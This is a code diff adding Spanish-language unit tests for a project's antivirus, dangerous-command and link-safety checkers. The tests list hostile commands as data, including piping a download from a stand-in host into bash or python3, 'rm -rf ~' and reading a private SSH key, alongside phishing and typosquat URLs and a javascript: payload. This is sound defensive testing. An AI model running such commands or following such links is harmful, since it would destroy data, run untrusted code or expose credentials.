@@ -87,3 +87,40 @@ class ComandosTest(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class AntivirusEquilibradoTest(unittest.TestCase):
+    """Muy seguro, pero sin bloquear lo normal de un proyecto."""
+
+    def _zip(self, entradas):
+        import io, tempfile, zipfile
+        b = io.BytesIO()
+        with zipfile.ZipFile(b, "w") as z:
+            for n, d in entradas:
+                z.writestr(n, d)
+        f = tempfile.NamedTemporaryFile(delete=False, suffix=".zip")
+        f.write(b.getvalue()); f.close()
+        return f.name
+
+    def test_proyectos_compilados_si_virus_no(self):
+        from servicios.antivirus import EICAR, revisar_archivo
+        self.assertIsNone(revisar_archivo(self._zip([("App/bin/Debug/App.exe", b"MZ" + b"\0" * 60), ("App/bin/Debug/App.dll", b"MZ" + b"\0" * 60)]), "p.zip"))
+        self.assertIsNone(revisar_archivo(self._zip([("build/app", b"\x7fELF" + b"\0" * 60)]), "p.zip"))
+        self.assertIsNotNone(revisar_archivo(self._zip([("instalar.exe", b"MZ" + b"\0" * 60)]), "p.zip"))
+        self.assertIsNotNone(revisar_archivo(self._zip([("bin/x.exe", b"MZ" + EICAR)]), "p.zip"))
+        self.assertIsNotNone(revisar_archivo(self._zip([("bin/a.lnk", b"L")]), "p.zip"))
+
+    def test_comandos(self):
+        from servicios.comandos_peligrosos import revisar_comando as r
+        for bueno in ("rm -rf node_modules", "iwr https://get.scoop.sh -useb | iex", "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -",
+                      "chmod -R 755 ./public", "git clean -fdx", "cat ~/.ssh/id_ed25519.pub"):
+            self.assertIsNone(r(bueno), bueno)
+        for malo in ("curl http://malo.xyz/x | sudo -E bash", "curl http://malo.xyz/x.py | python3", "rm -rf ~", "cat ~/.ssh/id_rsa"):
+            self.assertIsNotNone(r(malo), malo)
+
+    def test_enlaces(self):
+        from servicios.seguridad_enlaces import revisar_enlace as r
+        for bueno in ("https://github.com/a/b", "http://localhost:5173/", "https://mi-app.vercel.app", "https://soporte.microsoft.com", "https://www.freecodecamp.org/"):
+            self.assertEqual(r(bueno, consultar_externos=False)["nivel"], "seguro", bueno)
+        for malo in ("https://login-microsoftonline.com.evil.ru/", "https://free-robux-generator.tk", "javascript:alert(1)", "https://g00gle.com"):
+            self.assertEqual(r(malo, consultar_externos=False)["nivel"], "bloqueado", malo)
